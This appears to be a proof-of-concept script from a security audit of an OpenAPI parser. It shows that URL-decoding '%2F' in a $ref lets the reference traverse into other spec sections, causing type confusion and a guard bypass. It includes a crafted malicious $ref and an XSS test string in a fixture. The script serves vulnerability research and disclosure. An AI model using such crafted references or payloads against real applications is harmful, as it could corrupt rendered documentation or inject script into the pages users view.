#!/usr/bin/env node
/**
 * PoC: M7 — decodeURIComponent Before JSON Pointer Resolution Enables Cross-Section Traversal
 *
 * Vulnerability: src/services/OpenAPIParser.ts:61
 *   ref = decodeURIComponent(ref);
 *
 * When byRef() receives a $ref containing %2F (URL-encoded slash), it decodes the entire
 * string BEFORE splitting into JSON Pointer segments.  The resulting literal '/' creates
 * extra pointer segments that silently traverse into unintended spec sections, returning
 * a string primitive where schema consumers expect an object.
 *
 * This PoC exercises the exact code path without a running server — it imports the same
 * json-pointer library that Acme uses and replays the OpenAPIParser.byRef() logic verbatim.
 */

'use strict';

const jp = require('/Users/<user>/Desktop/oss-to-run/acme/node_modules/json-pointer');

// ── Verbatim reimplementation of JsonPointer.get from src/utils/JsonPointer.ts ──────────────
function jsonPointerGet(object, pointer) {
  let ptr = pointer;
  if (ptr.charAt(0) === '#') {
    ptr = ptr.substring(1); // strip leading '#' (Acme's custom parse wrapper)
  }
  return jp.get(object, ptr);
}

// ── Verbatim reimplementation of OpenAPIParser.byRef (src/services/OpenAPIParser.ts:53-68) ──
function byRef(spec, ref) {
  if (ref.charAt(0) !== '#') {
    ref = '#' + ref;
  }
  ref = decodeURIComponent(ref); // <-- VULNERABLE LINE (OpenAPIParser.ts:61)
  let res;
  try {
    res = jsonPointerGet(spec, ref);
  } catch (e) {
    // intentionally swallowed — same as source
  }
  return res || {};
}

// ── Fixture: minimal OpenAPI spec with attacker-influenced info.description ───────────────────
const spec = {
  openapi: '3.0.0',
  info: {
    title: 'Victim API',
    version: '1.0.0',
    description: '<script>alert(1)</script> ATTACKER_CONTROLLED_CONTENT',
  },
  components: {
    schemas: {
      SafeSchema: { type: 'object', properties: { id: { type: 'integer' } } },
      // Attacker plants a schema whose $ref uses %2F to escape component boundaries:
      PoisonedSchema: { $ref: '#/info%2Fdescription' },
    },
  },
};

// ── Step 1: Resolve a legitimate $ref (baseline) ─────────────────────────────────────────────
const legitimateRef  = '#/components/schemas/SafeSchema';
const legitimateResult = byRef(spec, legitimateRef);
console.log('[BASELINE] byRef("' + legitimateRef + '")');
console.log('  typeof result :', typeof legitimateResult);
console.log('  result        :', JSON.stringify(legitimateResult));
console.log('  is schema obj :', typeof legitimateResult === 'object' && legitimateResult !== null);
console.log();

// ── Step 2: Attack — %2F in $ref crosses spec section boundary ────────────────────────────────
const maliciousRef = '#/info%2Fdescription';          // attacker-supplied $ref value
const decoded      = decodeURIComponent(maliciousRef); // what line :61 produces
const attackResult = byRef(spec, maliciousRef);

console.log('[ATTACK] byRef("' + maliciousRef + '")');
console.log('  decoded pointer (post-decodeURIComponent) :', decoded);
console.log('  typeof result                             :', typeof attackResult);
console.log('  result                                    :', JSON.stringify(attackResult));
console.log('  expected (schema object)                  : false');
console.log('  type-confusion confirmed                  :', typeof attackResult === 'string');
console.log();

// ── Step 3: Demonstrate bypass of the !resolved guard (OpenAPIParser.ts:103) ─────────────────
const resolved = attackResult;
const guardBypassed = !!resolved; // truthy string passes `if (!resolved)` check
console.log('[GUARD BYPASS] if (!resolved) check at :103');
console.log('  resolved value     :', JSON.stringify(resolved));
console.log('  !!resolved         :', guardBypassed, '← string is truthy; no Error thrown');
console.log('  downstream receives: a STRING where it expects an OpenAPI schema OBJECT');
console.log();

// ── Step 4: Show downstream impact — schema consumers receive a string ────────────────────────
function simulateMergeAllOf(schema) {
  // mergeAllOf and Schema.ts call .allOf, .properties, etc. on the resolved value
  return {
    allOf:      schema.allOf,       // undefined on a string
    properties: schema.properties,  // undefined on a string
    type:       schema.type,        // undefined on a string — string chars are NOT schema keys
    // Iterating chars of the string as if it were a schema object:
    stringKeys: typeof schema === 'string' ? Object.keys(Object(schema)) : null,
  };
}
const downstreamResult = simulateMergeAllOf(resolved);
console.log('[DOWNSTREAM IMPACT] simulated mergeAllOf/Schema.ts on resolved value');
console.log('  allOf       :', downstreamResult.allOf);
console.log('  properties  :', downstreamResult.properties);
console.log('  type        :', downstreamResult.type);
console.log('  string keys :', JSON.stringify(downstreamResult.stringKeys));
console.log('  all schema fields undefined — downstream silently renders an empty/broken schema');
console.log();

// ── Assertions ────────────────────────────────────────────────────────────────────────────────
const typeMismatch  = typeof attackResult === 'string';
const contentLeak   = typeof attackResult === 'string' && attackResult === spec.info.description;
const guardBypass   = !!attackResult; // truthy, so no error thrown at :103

if (!typeMismatch) {
  console.error('ASSERTION FAILED: expected string result from cross-section traversal');
  console.log(JSON.stringify({ status: 'failed', evidence: 'byRef did not return a string — traversal did not occur', notes: 'check json-pointer version' }));
  process.exit(1);
}

if (!contentLeak) {
  console.error('ASSERTION FAILED: resolved value does not match spec.info.description');
  console.log(JSON.stringify({ status: 'failed', evidence: 'resolved value mismatch', notes: attackResult }));
  process.exit(1);
}

console.log('[RESULT] vulnerability confirmed');
console.log('  1. %2F in $ref decoded to / before JSON Pointer split (RFC 6901 violation)');
console.log('  2. spec.info.description (string) returned as resolved schema');
console.log('  3. truthy-string guard bypass — no Error raised at OpenAPIParser.ts:103');
console.log('  4. downstream schema consumers receive string primitive instead of schema object');
console.log();

// LAST LINE — parsed by poc-runner ──────────────────────────────────────────────────────────
console.log(JSON.stringify({
  status: 'confirmed',
  evidence: 'byRef("#/info%2Fdescription") returned spec.info.description string "' + spec.info.description.slice(0, 40) + '..." instead of schema object; type-confusion + guard bypass at OpenAPIParser.ts:103 confirmed',
  notes: 'RFC 6901 violation: %2F decoded to / before JsonPointer.get split; affects src/services/OpenAPIParser.ts:61',
}));
